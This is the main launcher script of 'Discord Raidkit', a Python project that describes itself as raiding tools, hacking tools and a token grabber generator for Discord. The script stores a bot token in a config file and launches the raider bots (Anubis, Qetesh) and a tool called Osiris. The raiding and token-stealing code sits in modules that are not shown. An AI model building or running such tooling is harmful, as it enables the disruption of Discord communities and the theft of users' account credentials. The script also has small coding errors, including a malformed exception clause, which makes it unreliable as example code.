"""
Discord Raidkit v2.3.4 — "The trojan horse of discord raiding"
Copyright © 2023 the-cult-of-integral

a collection of raiding tools, hacking tools, and a token grabber generator for discord; written in Python 3

This program is under the GNU General Public License v2.0.
https://github.com/the-cult-of-integral/discord-raidkit/blob/master/LICENSE

main.py handles running the Discord Raidkit suite.
main.py was last updated on 05/03/23 at 23:20 UTC.
"""

import json
import logging
import webbrowser
from asyncio.proactor_events import _ProactorBasePipeTransport
from os.path import exists
import requests
from colorama import Fore, init
from discord.errors import (HTTPException, LoginFailure,
                            PrivilegedIntentsRequired)

from constants import (ANUBIS_ID, HEADERS, MY_VERSION, OSIRIS_ID, QETESH_ID,
                       RELEASES_URL)
from tools.osiris import Osiris
from tools.raider import Raider
from utils import (clear_screen, init_logger, mkfile,
                   repeat_prompt_until_valid_input)

init()
init_logger()


def silence_event_loop_closed_exception(func):
    """
    Decorator to silence the exception 'Event loop is closed' 
    when using asyncio on Windows.
    """
    def wrapper(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except RuntimeError as e:
            if str(e) != 'Event loop is closed':
                raise e

    return wrapper


def get_latest_version() -> str:
    """Returns the latest version of the application."""
    r = requests.get(RELEASES_URL, headers=HEADERS)
    return r.url.split('/')[-1]


def check_for_updates() -> None:
    """
    Checks for updates and prompts the user to update.
    if there is an update available.
    """
    if (latest_version := get_latest_version()) != MY_VERSION:
        match repeat_prompt_until_valid_input(f"""{Fore.LIGHTGREEN_EX}New Version Available 
{Fore.LIGHTWHITE_EX}https://github.com/the-cult-of-integral/discord-raidkit/releases/tag/{latest_version}

{Fore.LIGHTGREEN_EX}[1] Open in browser and continue
[2] Open in browser and exit
[3] Continue

>>> {Fore.LIGHTWHITE_EX}""", '123'):
            case '1':
                webbrowser.open(RELEASES_URL)
            case '2':
                webbrowser.open(RELEASES_URL)
                raise SystemExit
            case '3':
                pass


def run_tool(tool_id: int) -> bool:
    
    def run_radier(tool_id: int):
        with open('config.json', 'r') as f:
            cfg = json.load(f)
        
        a = cfg["prefix"]
        b = cfg["app_id"]
        c = cfg["token"]
        d = all(s for s in cfg["statuses"])
        
        if not (a and b and c):
            logging.error('Invalid config provided')
            raise SystemExit
        
        if not d:
            statuses = None
        
        statuses = cfg["statuses"]
        
        try:
            bot = Raider(tool_id, cfg["prefix"], cfg["app_id"], statuses)
            bot.run(cfg["token"])
        except HTTPException and LoginFailure:
            logging.error('Invalid token provided')
            raise SystemExit
        except PrivilegedIntentsRequired:
            logging.error('Privileged intents are required')
            raise SystemExit
        except Exception as e:
            match tool_id:
                case 1:
                    tool = 'Anubis'
                case 2:
                    tool = 'Qetesh'
            logging.error(f'An error occurred trying to start {tool}: {e}')
            raise SystemExit
    
    clear_screen()    
    match tool_id:
        case 1:
            run_radier(tool_id)
        case 2:
            run_radier(tool_id)
        case 3:
            o = Osiris()
            o.run()


def select_tool() -> None:
    """Prompts the user to select a tool."""
    match repeat_prompt_until_valid_input(f"""{Fore.LIGHTGREEN_EX}Discord Raidit {MY_VERSION}

{Fore.LIGHTBLUE_EX}[1] Anubis
{Fore.LIGHTRED_EX}[2] Qetesh
{Fore.LIGHTYELLOW_EX}[3] Osiris
{Fore.RED}[4] Exit

{Fore.LIGHTGREEN_EX}>>> {Fore.LIGHTWHITE_EX}""", '1234'):
        case '1':
            run_tool(ANUBIS_ID)
        case '2':
            run_tool(QETESH_ID)
        case '3':
            run_tool(OSIRIS_ID)
        case '4':
            raise SystemExit
        case _:
            raise SystemExit


def main():
    _ProactorBasePipeTransport.__del__ = silence_event_loop_closed_exception(
        _ProactorBasePipeTransport.__del__
    )
    check_for_updates()
    clear_screen()
    if not exists('config.json'):
        print('config.json not found, creating...\n')
        print('Enter a prefix for raider bots (e.g. $): ', end='')
        prefix = input()
        print('Enter a status for raider bots (split multiple by comma) (e.g. $help,$www.google.com): ', end='')
        statuses = input().split(',')
        print('Enter an application ID for raider bots (e.g. 123456789012345678): ', end='')
        app_id = input()
        print('Enter a token for raider bots: ', end='')
        token = input()
        mkfile('config.json', json.dumps({
            'prefix': prefix,
            'statuses': statuses,
            'app_id': app_id,
            'token': token
        }))
    select_tool()
    


if __name__ == '__main__':
    main()
